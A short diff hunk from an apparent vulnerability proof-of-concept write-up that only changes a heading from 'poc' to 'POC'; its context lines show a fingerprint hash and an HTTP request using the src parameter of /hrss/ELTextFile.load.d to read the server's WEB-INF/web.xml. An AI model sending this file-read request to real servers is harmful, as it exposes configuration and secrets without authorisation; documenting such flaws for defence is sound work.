@@ -8,7 +8,7 @@
 icon_hash="-628229493"
 ```
 
-## poc
+## POC
 
 ```
 GET /hrss/ELTextFile.load.d?src=WEB-INF/web.xml HTTP/1.1
